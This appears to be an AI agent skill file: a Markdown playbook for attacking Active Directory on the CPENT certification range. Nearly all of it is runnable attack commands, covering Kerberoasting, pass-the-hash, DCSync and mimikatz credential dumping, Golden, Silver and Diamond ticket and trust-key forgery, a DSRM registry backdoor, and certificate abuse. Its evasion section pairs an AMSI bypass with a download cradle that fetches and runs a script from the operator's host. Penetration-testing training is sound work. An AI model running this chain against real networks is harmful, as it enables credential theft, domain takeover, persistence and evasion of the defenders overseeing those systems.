---
name: active-directory
description: Active Directory attack playbook for CPENT Zone 2 — enumeration, Kerberos roasting (incl. cross-forest), lateral movement, credential extraction, and domain dominance. Use once you have pivoted into the domain. Covers CPENT v2 cross-forest trust scenarios.
---

# Active Directory (Zone 2, 15%)

AD is **not reachable from outside** — pivot in first (`pivoting` skill). Then the chain is:
enumerate → harvest creds → lateral → privesc → domain admin. CPENT v2 adds **cross-forest**
scenarios, so enumerate trusts and try roasting across them.

Keep a running credential file — reuse is rampant (`bin/cpent cred add/list`).

## Enumerate

Impacket tools have two naming conventions on Kali — use `bin/cpent impacket <tool.py>` to
find the right binary. All commands below use evidence capture for auto-logging.

```
# Use evidence capture for all AD commands:
bin/cpent ev "bloodhound-python -u <u> -p <p> -d <domain> -c all -ns <dc-ip>" --ip <dc-ip> --zone active-directory --label bloodhound
bin/cpent ev "$(bin/cpent impacket GetADUsers.py) <domain>/<u>:<p> -dc-ip <dc-ip> -all" --ip <dc-ip> --zone active-directory
bin/cpent ev "crackmapexec smb <dc-ip> -u <u> -p <p> --users --groups --shares" --ip <dc-ip> --zone active-directory

# trusts (cross-forest): from a Windows foothold
bin/cpent ev "nltest /domain_trusts" --ip <dc-ip> --zone active-directory --remote winrm --user <u> --secret '<p>'
```

## Kerberos — easy early wins, always try

```
# Find the right impacket binary first:
GSPN=$(bin/cpent impacket GetUserSPNs.py)
GNPU=$(bin/cpent impacket GetNPUsers.py)

# Kerberoast (SPN accounts) — crack with hashcat -m 13100
bin/cpent ev "$GSPN <domain>/<u>:<p> -request -dc-ip <dc-ip>" --ip <dc-ip> --zone active-directory --label kerberoast
# across a forest trust: add -target-domain <trusted.forest>

# AS-REP roast (no-preauth users) — crack with hashcat -m 18200
bin/cpent ev "$GNPU <domain>/ -usersfile users.txt -no-pass -dc-ip <dc-ip>" --ip <dc-ip> --zone active-directory --label asrep

# Crack with best available wordlist:
hashcat -m 13100 hash.txt $(bin/cpent wordlist brute-full)      # rockyou for Kerberoast
hashcat -m 18200 hash.txt $(bin/cpent wordlist brute-full)      # rockyou for AS-REP
```

## Lateral movement

```
psexec.py -hashes :<ntlm> <domain>/<u>@<t>        # pass-the-hash
wmiexec.py <domain>/<u>:<p>@<t>
evil-winrm -i <t> -u <u> -H <hash>
crackmapexec smb <subnet>/24 -u <u> -H <hash> -x 'whoami'   # spray + exec
```

## Credential extraction

```
secretsdump.py <domain>/<admin>@<dc-ip>           # remote SAM/LSA/NTDS
secretsdump.py -just-dc <domain>/<u>@<dc-ip>      # DCSync (needs replication rights)
# on-host: mimikatz  sekurlsa::logonpasswords ; lsadump::dcsync /user:krbtgt
```

## Domain dominance (ticket attacks)

Match the ticket to the secret you have:

| Attack | You need | Gives you |
|---|---|---|
| **Over-Pass-the-Hash** | a user's NTLM **or** AES256 key | a real TGT as that user (`Rubeus asktgt /user:.. /aes256:.. /ptt`) |
| **Silver Ticket** | the *service account* NTLM/RC4 (or the DC machine key for DC services) | a forged TGS for one service — no DC contact |
| **Golden Ticket** | the **krbtgt** AES256/RC4 + domain SID | a forged TGT as anyone, domain-wide |
| **Diamond Ticket** | the **krbtgt** key | a TGT cloned from a real one — stealthier than Golden |

- Get the krbtgt/service/machine secrets via **DCSync** (`secretsdump -just-dc`, or
  mimikatz `lsadump::dcsync`) once you hold replication rights or DA.
- Prefer **AES256 over NTLM** for ticket requests (opsec / fewer alerts).
- Delegation abuse (unconstrained / constrained / RBCD) and GPO abuse are alternative paths
  to the same secrets.

## DSRM (DC local persistence)

The DC's local Administrator (DSRM) hash is a backdoor. Extract it (`lsadump::lsa /patch`
or DCSync-equivalent), then enable network logon with it:
`reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2`,
then pass-the-hash as `<DC>\Administrator`.

## ADCS (certificate abuse)

If AD CS is present, a vulnerable template often beats password cracking: request a cert as
a Domain Admin / Enterprise Admin (the classic ESC1-style misconfig), save the `.pfx`, then
authenticate with it (`Rubeus asktgt /certificate:.. /ptt` or certipy). Enumerate first
(`certipy find` / Certify).

## Cross-domain (child → parent, same forest)

The forest is the real trust boundary — child DA can usually reach forest root:
- Forge a Golden Ticket with the **child krbtgt** and add the **parent/Enterprise Admins
  SID** to `/sids:` (SID-history injection), then `asktgs` for a service on the parent DC.

## Cross-forest (CPENT v2 tests this)

Across a forest **trust**, you don't get the trusted forest's krbtgt — you get the
**trust key**:
1. Extract the **inter-realm trust key** from your DC (`lsadump::trust /patch` / DCSync).
2. Forge an **inter-realm TGT** with that trust key for the trusted forest.
3. `Rubeus asktgs /service:<svc>/<trusted-dc>.<TRUSTED.FOREST> /dc:<trusted-dc> /ptt` to get
   a usable service ticket in the other forest, then act on that service.
- Also try: Kerberoasting across the trust (`GetUserSPNs -target-domain`), foreign-group
  membership, and any admin whose creds you already hold that are valid in both forests
  (reuse — check the tracker).

## AD evasion (when the range has logging/AppLocker/AMSI)

See the `defense-evasion` skill too. On a constrained host, before running tooling:
- Check the jail: `$ExecutionContext.SessionState.LanguageMode` (want FullLanguage),
  `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`.
- Reduce logging with an InviShell-style registry wrapper; use an AMSI bypass before a
  download cradle (`iex (iwr -UseBasicParsing http://<you>/amsibypass.txt)`).
- Find lateral targets without scanning: `Find-PSRemotingLocalAdminAccess`.
- Use captured creds in a new logon context: `runas /user:<dom>\<user> /netonly cmd`.

Write a finding for each foothold, each DA/EA, each cracked or DCSync'd secret, and every
cross-trust hop (the attack narrative in the report is graded on exactly this chain).
